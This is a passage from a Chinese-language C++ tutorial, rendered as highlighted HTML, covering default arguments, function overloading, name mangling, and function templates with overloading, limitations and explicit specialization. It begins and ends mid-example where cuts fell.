occurred&quot;, , &quot;Error: &quot;); // 非法！不能跳过 level</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数定义 (注意：这里不再重复默认值)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">log_message</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; message, <span class="keyword">int</span> level, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; prefix)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; prefix &lt;&lt; <span class="string">&quot;[Level &quot;</span> &lt;&lt; level &lt;&lt; <span class="string">&quot;] &quot;</span> &lt;&lt; message &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Info: [Level 0] System started.</span><br><span class="line">Log: [Level 2] Processing data...</span><br><span class="line">Log: [Level 1] Operation complete.</span><br></pre></td></tr></table></figure><p><strong>代码解释:</strong></p><ol><li> <code>log_message</code> 函数的原型为 <code>level</code> 和 <code>prefix</code> 参数指定了默认值。</li><li><code>main</code> 函数展示了不同的调用方式：<ul><li>  第一次调用提供了所有三个参数。</li><li>  第二次调用只提供了 <code>message</code> 和 <code>level</code>，<code>prefix</code> 使用了默认值 <code>&quot;Log: &quot;</code>。</li><li>  第三次调用只提供了 <code>message</code>，<code>level</code> 使用了默认值 <code>1</code>，<code>prefix</code> 使用了默认值 <code>&quot;Log: &quot;</code>。</li></ul></li><li> 函数定义部分没有重复默认值，只列出了参数类型和名称。</li></ol><p>默认参数是 C++ 中一个方便的特性，可以使函数接口更加灵活和易用，尤其是在处理具有多个配置选项或不常用参数的函数时。</p><h2 id="8-4-函数重载"><a href="#8-4-函数重载" class="headerlink" title="8.4 函数重载"></a>8.4 函数重载</h2><p><strong>函数重载 (Function Overloading)</strong> 是 C++ 的一项特性，允许在<strong>同一个作用域</strong>内定义多个同名函数，只要它们的<strong>参数列表（也称为函数签名）</strong>不同即可。参数列表的不同可以体现在参数的<strong>数量</strong>、<strong>类型</strong>或<strong>顺序</strong>上。编译器会根据函数调用时提供的实参类型和数量来决定具体调用哪个重载版本。</p><p><strong>函数签名:</strong> 函数的名称和其参数列表（参数的类型、数量和顺序）共同构成了函数签名。<strong>注意：函数的返回类型不属于函数签名的一部分，不能仅凭返回类型不同来重载函数。</strong></p><p><strong>目的:</strong></p><ul><li>  允许使用相同的函数名来执行概念上相似但操作于不同数据类型或参数组合的任务。</li><li>  提高代码的可读性和易用性，用户不必为相似操作记住多个不同的函数名。</li></ul><h3 id="8-4-1-重载示例"><a href="#8-4-1-重载示例" class="headerlink" title="8.4.1 重载示例"></a>8.4.1 重载示例</h3><p>假设我们需要一个函数来打印不同类型的数据。使用函数重载，我们可以定义多个名为 <code>print</code> 的函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 重载版本 1: 打印 int</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Printing int: &quot;</span> &lt;&lt; i &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重载版本 2: 打印 double</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">double</span> d)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Printing double: &quot;</span> &lt;&lt; d &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重载版本 3: 打印字符串 (const char*)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* s)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Printing C-string: &quot;</span> &lt;&lt; s &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重载版本 4: 打印 std::string (常量引用)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; s)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Printing std::string: &quot;</span> &lt;&lt; s &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重载版本 5: 打印两个 int</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Printing two ints: &quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot; and &quot;</span> &lt;&lt; j &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 错误示例：仅返回类型不同，无法重载</span></span><br><span class="line"><span class="comment">// int print(int i) &#123;</span></span><br><span class="line"><span class="comment">//     std::cout &lt;&lt; &quot;Trying to return int: &quot; &lt;&lt; i &lt;&lt; std::endl;</span></span><br><span class="line"><span class="comment">//     return i;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    print(<span class="number">10</span>);          <span class="comment">// 调用版本 1 (int)</span></span><br><span class="line">    print(<span class="number">3.14</span>);        <span class="comment">// 调用版本 2 (double)</span></span><br><span class="line">    print(<span class="string">&quot;Hello&quot;</span>);     <span class="comment">// 调用版本 3 (const char*)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> msg = <span class="string">&quot;World&quot;</span>;</span><br><span class="line">    print(msg);         <span class="comment">// 调用版本 4 (const std::string&amp;)</span></span><br><span class="line">    print(<span class="number">5</span>, <span class="number">20</span>);       <span class="comment">// 调用版本 5 (int, int)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// print(10L); // 可能产生歧义调用，因为 long 可以转换为 int 或 double</span></span><br><span class="line">                 <span class="comment">// 编译器可能报错或选择一个最佳匹配</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>代码解释:</strong></p><ul><li>  我们定义了五个名为 <code>print</code> 的函数，但它们的参数列表各不相同（类型或数量不同）。</li><li>  在 <code>main</code> 函数中，编译器根据传递给 <code>print</code> 的实参类型和数量，自动选择了正确的重载版本进行调用。</li></ul><p><strong>名称修饰 (Name Mangling):</strong></p><p>C++ 编译器内部通过一种称为<strong>名称修饰</strong>或<strong>名称改编</strong>（Name Mangling）的技术来区分同名的重载函数。它会根据函数的签名（包括参数类型）生成一个内部唯一的名称。例如，<code>print(int)</code> 和 <code>print(double)</code> 在编译后会变成不同的内部名称，这样链接器就能正确地将函数调用链接到对应的函数定义。</p><h3 id="8-4-2-何时使用函数重载"><a href="#8-4-2-何时使用函数重载" class="headerlink" title="8.4.2 何时使用函数重载"></a>8.4.2 何时使用函数重载</h3><p>函数重载是一个强大的工具，但应谨慎使用，以保持代码的清晰性。以下是一些适合使用函数重载的情况：</p><ol><li> <strong>执行概念上相似的任务:</strong> 当多个函数执行的操作逻辑上相似，只是处理的数据类型不同时（如上例中的 <code>print</code> 函数，或计算不同类型数值绝对值的 <code>abs</code> 函数）。</li><li> <strong>提供不同参数组合:</strong> 当一个任务可以通过提供不同数量或类型的参数来完成时（例如，一个构造函数可以接受不同的初始化参数组合）。</li></ol><p><strong>避免使用函数重载的情况:</strong></p><ol><li> <strong>执行完全不同的任务:</strong> 如果函数虽然名称相同，但执行的任务在逻辑上毫不相关，那么重载可能会导致混淆。此时应使用不同的函数名。</li><li> <strong>仅参数类型可通过默认参数或模板实现:</strong> 如果函数的功能差异可以通过默认参数或函数模板（见 8.5 节）更清晰地表达，那么可能不需要重载。例如，如果只是参数数量不同，且较少参数的版本可以通过为较多参数版本提供默认值来实现，那么默认参数可能更合适。</li></ol><p><strong>总结:</strong></p><p>函数重载允许我们用同一个名称定义多个功能相似但参数列表不同的函数。编译器根据调用时提供的实参来选择正确的版本。这是 C++ 实现多态性的一种方式（编译时多态），可以使代码更直观、更易用，但应确保重载的函数在逻辑上是相关的，以避免混淆。</p><h2 id="8-5-函数模板"><a href="#8-5-函数模板" class="headerlink" title="8.5 函数模板"></a>8.5 函数模板</h2><p>函数重载允许我们为不同的参数类型定义同名函数，但如果这些函数的逻辑完全相同，只是处理的数据类型不同，为每种类型都写一个重载版本会很繁琐且容易出错。例如，交换两个 <code>int</code> 和交换两个 <code>double</code> 的逻辑是一样的。</p><p><strong>函数模板 (Function Template)</strong> 提供了一种更通用的解决方案。它允许我们编写一个<strong>与类型无关</strong>的函数定义，其中的数据类型使用<strong>模板参数</strong>（也叫类型参数）来表示。编译器会根据函数调用时使用的具体数据类型，自动生成（实例化）相应的函数版本。</p><p><strong>目的:</strong></p><ul><li>  编写通用的、可重用的代码，适用于多种数据类型。</li><li>  减少代码重复。</li><li>  提高代码的可维护性。</li></ul><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="comment">// 或者 template &lt;class T&gt;</span></span><br><span class="line"><span class="function">return_type <span class="title">function_name</span><span class="params">(parameter_list)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 函数体，可以使用类型参数 T</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>template &lt;typename T&gt;</code>: 这是模板声明，告诉编译器接下来是一个模板定义。<code>typename</code> 是关键字（也可以用 <code>class</code> 关键字代替，两者在这里等价），<code>T</code> 是模板参数的名称（通常用大写字母，如 <code>T</code>, <code>U</code>, <code>V</code>，但可以是任何合法标识符）。你可以定义多个模板参数，用逗号分隔，例如 <code>template &lt;typename T, typename U&gt;</code>。</li><li>  <code>return_type</code>, <code>parameter_list</code>, <code>function_name</code>: 与普通函数定义类似，但可以在这些部分使用模板参数 <code>T</code> 来代表某种待定的数据类型。</li></ul><p><strong>示例：通用的交换函数模板</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个函数模板 Swap</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="comment">// T 代表任意类型</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Swap</span><span class="params">(T&amp; a, T&amp; b)</span> </span>&#123; <span class="comment">// 参数是类型 T 的引用</span></span><br><span class="line">    T temp; <span class="comment">// 声明一个类型为 T 的临时变量</span></span><br><span class="line">    temp = a;</span><br><span class="line">    a = b;</span><br><span class="line">    b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">10</span>, j = <span class="number">20</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Original ints: i = &quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;, j = &quot;</span> &lt;&lt; j &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    Swap(i, j); <span class="comment">// 编译器自动生成 Swap&lt;int&gt;(int&amp;, int&amp;) 版本</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Swapped ints: i = &quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;, j = &quot;</span> &lt;&lt; j &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">double</span> x = <span class="number">1.5</span>, y = <span class="number">2.8</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nOriginal doubles: x = &quot;</span> &lt;&lt; x &lt;&lt; <span class="string">&quot;, y = &quot;</span> &lt;&lt; y &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    Swap(x, y); <span class="comment">// 编译器自动生成 Swap&lt;double&gt;(double&amp;, double&amp;) 版本</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Swapped doubles: x = &quot;</span> &lt;&lt; x &lt;&lt; <span class="string">&quot;, y = &quot;</span> &lt;&lt; y &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> c1 = <span class="string">&#x27;A&#x27;</span>, c2 = <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nOriginal chars: c1 = &quot;</span> &lt;&lt; c1 &lt;&lt; <span class="string">&quot;, c2 = &quot;</span> &lt;&lt; c2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    Swap(c1, c2); <span class="comment">// 编译器自动生成 Swap&lt;char&gt;(char&amp;, char&amp;) 版本</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Swapped chars: c1 = &quot;</span> &lt;&lt; c1 &lt;&lt; <span class="string">&quot;, c2 = &quot;</span> &lt;&lt; c2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Swap(i, x); // 错误！编译器无法推断出唯一的 T 类型 (int vs double)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>代码解释:</strong></p><ol><li> 我们定义了一个名为 <code>Swap</code> 的函数模板，它使用类型参数 <code>T</code>。</li><li> 在 <code>main</code> 函数中，当我们调用 <code>Swap(i, j)</code> 时，编译器看到两个实参都是 <code>int</code> 类型，于是它推断出 <code>T</code> 应该是 <code>int</code>，并自动生成（实例化）一个专门处理 <code>int</code> 的 <code>Swap</code> 函数版本：<code>void Swap&lt;int&gt;(int&amp; a, int&amp; b)</code>。</li><li> 类似地，调用 <code>Swap(x, y)</code> 时，编译器生成 <code>Swap&lt;double&gt;</code> 版本；调用 <code>Swap(c1, c2)</code> 时，生成 <code>Swap&lt;char&gt;</code> 版本。</li><li> 这个过程称为**模板实例化 (Template Instantiation)**。编译器只为程序中实际用到的类型生成函数实例。</li></ol><h3 id="8-5-1-重载的模板"><a href="#8-5-1-重载的模板" class="headerlink" title="8.5.1 重载的模板"></a>8.5.1 重载的模板</h3><p>函数模板也可以像普通函数一样被<strong>重载</strong>。你可以提供多个同名的函数模板，只要它们的模板参数列表不同，或者函数参数列表（非模板参数部分）不同即可。</p><p><strong>示例：重载模板以处理不同数量的参数或特定类型</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 模板版本 1: 交换两个同类型变量</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Swap</span><span class="params">(T&amp; a, T&amp; b)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Using Swap(T&amp;, T&amp;)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    T temp = a;</span><br><span class="line">    a = b;</span><br><span class="line">    b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 模板版本 2: 交换两个数组的元素 (需要额外参数指定大小)</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Swap</span><span class="params">(T arr1[], T arr2[], <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Using Swap(T[], T[], int)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        T temp = arr1[i];</span><br><span class="line">        arr1[i] = arr2[i];</span><br><span class="line">        arr2[i] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">10</span>, j = <span class="number">20</span>;</span><br><span class="line">    Swap(i, j); <span class="comment">// 调用版本 1: Swap&lt;int&gt;(int&amp;, int&amp;)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> arr_a[] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> arr_b[] = &#123;<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> size = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nBefore swapping arrays:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;arr_a: &quot;</span> &lt;&lt; arr_a[<span class="number">0</span>] &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; arr_a[<span class="number">1</span>] &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; arr_a[<span class="number">2</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;arr_b: &quot;</span> &lt;&lt; arr_b[<span class="number">0</span>] &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; arr_b[<span class="number">1</span>] &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; arr_b[<span class="number">2</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    Swap(arr_a, arr_b, size); <span class="comment">// 调用版本 2: Swap&lt;int&gt;(int[], int[], int)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nAfter swapping arrays:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;arr_a: &quot;</span> &lt;&lt; arr_a[<span class="number">0</span>] &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; arr_a[<span class="number">1</span>] &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; arr_a[<span class="number">2</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;arr_b: &quot;</span> &lt;&lt; arr_b[<span class="number">0</span>] &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; arr_b[<span class="number">1</span>] &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; arr_b[<span class="number">2</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译器会根据调用时提供的参数数量和类型（包括是否是数组）来选择最匹配的重载模板。</p><h3 id="8-5-2-模板的局限性"><a href="#8-5-2-模板的局限性" class="headerlink" title="8.5.2 模板的局限性"></a>8.5.2 模板的局限性</h3><p>函数模板是通用的，但并非万能。模板代码中使用的操作（如赋值 <code>=</code>、比较 <code>&lt;</code>、<code>&gt;</code> 等）必须对实例化时使用的具体类型有效。如果某个类型不支持模板代码中的操作，那么实例化该类型的模板就会导致编译错误。</p><p><strong>示例：模板可能失败的情况</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CompareAndPrint</span><span class="params">(<span class="keyword">const</span> T&amp; a, <span class="keyword">const</span> T&amp; b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a &lt; b) &#123; <span class="comment">// 假设类型 T 支持 &lt; 运算符</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a is less than b&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (b &lt; a) &#123; <span class="comment">// 假设类型 T 支持 &lt; 运算符</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;b is less than a&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a and b are equal (or incomparable)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Data</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    <span class="comment">// 这个结构体没有重载 &lt; 运算符</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x = <span class="number">5</span>, y = <span class="number">10</span>;</span><br><span class="line">    CompareAndPrint(x, y); <span class="comment">// OK: int 支持 &lt; 运算符</span></span><br><span class="line"></span><br><span class="line">    Data d1 = &#123;<span class="number">10</span>&#125;;</span><br><span class="line">    Data d2 = &#123;<span class="number">20</span>&#125;;</span><br><span class="line">    <span class="comment">// CompareAndPrint(d1, d2); // 编译错误！Data 类型没有定义 operator&lt;</span></span><br><span class="line">                               <span class="comment">// 编译器无法实例化 CompareAndPrint&lt;Data&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要解决这个问题，可以为 <code>Data</code> 结构重载 <code>&lt;</code> 运算符，或者使用下一节将介绍的<strong>显式具体化</strong>。</p><h3 id="8-5-3-显式具体化-Explicit-Specialization"><a href="#8-5-3-显式具体化-Explicit-Specialization" class="headerlink" title="8.5.3 显式具体化 (Explicit Specialization)"></a>8.5.3 显式具体化 (Explicit Specialization)</h3><p>有时，通用的函数模板对于某个特定类型可能不适用或效率不高，我们希望为这个特定类型提供一个专门的、非模板的实现。这就是<strong>显式具体化</strong>。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;&gt; <span class="comment">// 空的尖括号表示这是一个具体化</span></span><br><span class="line">return_type function_name&lt;specific_type&gt;(parameter_list_with_specific_type) &#123;</span><br><span class="line">    <span class="comment">// 针对 specific_type 的特殊实现</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>template &lt;&gt;</code>: 告诉编译器这是一个显式具体化。</li><li>  <code>function_name&lt;specific_type&gt;</code>: 在函数名后明确指定要为哪个类型提供具体化版本。</li><li>  函数体包含针对 <code>specific_type</code> 的特殊代码。</li></ul><p><strong>示例：为结构体具体化 Swap 模板</strong></p><p>假设我们有一个结构体，我们只想交换其中的某个成员，而不是整个结构体。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 